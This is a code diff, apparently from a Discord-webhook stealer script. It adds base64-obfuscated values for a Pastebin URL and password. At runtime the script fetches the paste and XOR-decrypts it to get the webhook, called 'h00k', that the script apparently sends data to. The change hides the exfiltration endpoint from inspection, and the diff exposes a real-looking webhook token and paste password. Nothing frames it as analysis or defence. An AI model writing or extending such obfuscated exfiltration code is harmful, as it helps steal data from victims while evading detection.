@@ -343,20 +343,22 @@ h00k = "https://discordapp.com/api/webhooks/1519042910644080661/ocU1bDtfeI6OTmvT
 # Fetch webhook from password-protected Pastebin.
 # Set _PASTE_B64 to base64 of your Pastebin raw URL, and _PASTE_PASSWORD to your password.
 # Generate the Pastebin content: python encrypt_paste.py <webhook_url> <password>
-_PASTE_B64 = ""
-_PASTE_PASSWORD = ""
+# Base64-obfuscated Pastebin URL and password (decoded at runtime)
+_PASTE_URL_B64 = "aHR0cHM6Ly9wYXN0ZWJpbi5jb20vWGptcUtWZHI="
+_PASTE_PW_B64 = "d1Rkd3Exek5xaQ=="
 def _xor(data, password):
     return bytes(data[i] ^ password[i % len(password)] for i in range(len(data)))
 
 def fetch_remote_webhook():
     global h00k
-    if not _PASTE_B64 or not _PASTE_PASSWORD:
+    paste_url = base64.b64decode(_PASTE_URL_B64).decode()
+    paste_pw = base64.b64decode(_PASTE_PW_B64).decode()
+    if not paste_url or not paste_pw:
         return
     try:
-        url = base64.b64decode(_PASTE_B64).decode()
-        resp = urlopen(Request(url), timeout=10)
+        resp = urlopen(Request(paste_url), timeout=10)
         payload = resp.read().decode().strip()
-        pw = _PASTE_PASSWORD.encode()
+        pw = paste_pw.encode()
         encrypted = base64.b64decode(payload)
         h00k = _xor(encrypted, pw).decode()
     except Exception:
